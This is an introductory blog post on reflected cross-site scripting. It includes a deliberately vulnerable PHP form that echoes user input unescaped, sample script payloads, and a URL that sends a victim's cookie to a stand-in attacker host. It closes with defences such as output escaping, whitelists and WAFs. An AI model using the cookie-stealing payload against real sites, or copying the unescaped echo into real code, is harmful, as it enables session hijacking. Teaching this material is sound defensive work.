---
title: "An Introduction to Cross-Site Scripting"
date: 2019-08-13
toc: true
toc_label: "Table of Contents"
categories:
  - blog
tags:
  - Web Security
  - Reflected XSS
  - PHP
---

# Introduction
So you've learned to create a PHP form recently and are very excited to set up a website with this form. You might think, "Ah, it's just a simple form, what could go wrong?". Well, you wouldn't be the first one to believe that. 

So let's take a look at a simple form that I have written.

```php
<!DOCTYPE html>
<html>
<body>
		<h1>Simple PHP Form</h1>
		<form method="GET" action="<?php echo $_SERVER['PHP_SELF'];?>">
			Name: <input type="text" name="fname">
			<input type="submit">
		</form>
		<?php
			if ($_SERVER["REQUEST_METHOD"] == "GET") {
				echo "<p>Hi " . $_GET['fname'] . "!</p>";
			}
		?>
</body>
</html>
```

Below we can see the form in the browser.

![Simple Form](../../assets/images/xss/1.png)

After typing my name in the input box, we get the following output.

![Input in Form](../../assets/images/xss/2.png)

Now you might be thinking that all is well and good, but what if someone submits the following text as input.

```
<b>Abhishek</b>
```

We get the following output.

![Form Output](../../assets/images/xss/3.png)

Wait, what? So if you pass in an HTML tag, the output is modified based on the tag. This is because when the PHP code echos the content of 'fname,' the resulting HTML sent back from the server looks like this. 

```
<p>Hi <b>Abhishek</b>!</p>
```

This can be verified by looking at the source.

![Page-Source-Inject-1](../../assets/images/xss/inject-1.png)

When the browser looks at the HTML, it sees the `<b>` tag and thinks that text in between is supposed to be rendered bold. The ability to pass in HTML code is known as HTML injection. This has a lot of implications (well other than being able to stylize your output). What if we want to pass in javascript code in the text field. Let's try the following input.

```javascript
<script>alert("test");</script>
```
We get the following output.

![JS in Form](../../assets/images/xss/5.png)

So why did this happen? Well, this is because like in the previous example, we were able to inject code into the page returned by the server. This can be seen by looking at the source. 

![Form-Source-JS](../../assets/images/xss/xss-1.png)

When the browser sees the `<script>` tag, it immediately runs the codes in between. What we saw above is called Cross-Site Scripting (XSS), more specifically Reflected XSS. It is reflected since the script passed in as input is bounced from the web server back to the user's browser. 

So what can we do with this? An alert box might not be harmful to the user, but what about the case where the user is logged in. If we pass the following as input

```javascript
<script>alert(document.cookie)</script>
```

we get the following output.

![cookie](../../assets/images/xss/6.png)

Since the cookie is retrievable, the attacker can, once he gets the cookie, log in as the user and wreak havoc. One way the attacker can retrieve the cookies is by setting up a web server and sending the URL with the malicious code to a target. When the user clicks on the link, his/her browser will then send the cookies to the attacker's server. An example of such an URL is as.

```javascript
http://vulnerable-website?param=<script>window.location="http://attackers-site.com/?cookie=" + document.cookie
</script>
```

The cookie is sent as a GET value which the attacker can then view on his/her server. 

# Well, how can we prevent the above attack? 
Some of the ways we can prevent XSS are:
Escaping all dynamic content, i.e., replace any characters that the browser will interpret with something called entities. For example, `<` is replaced with `&lt;`. This means that when the page is returned back to the user, the browser sees `&lt;`,  and renders it instead of interpreting it. Dynamic content is encoded by default by most modern frameworks. The following two functions can be used.

```
htmlspecialchars(): encodes special characters to HTML entities,
strip_tags(): removes the tags altogether and returns the inner text.
```

Another step that can be added is to use a whitelist. If a field can accept only a finite number of different inputs, we can check if the user-supplied data is in the whitelist. If the user passes in invalid data, we can simply reject it.

A more comprehensive solution is to use a Web Application Firewall (WAF). The WAF sits between the server and the client and filters out any message that contains malicious code. An open-source implementation of a WAF is provided by ModSecurity can be utilized (with care!).

Note that the above mechanisms serve as a base. With attackers coming up with new XSS attack vectors regularly, we must keep ourselves updated to stay safe. In a later post, I will talk about Stored XSS. 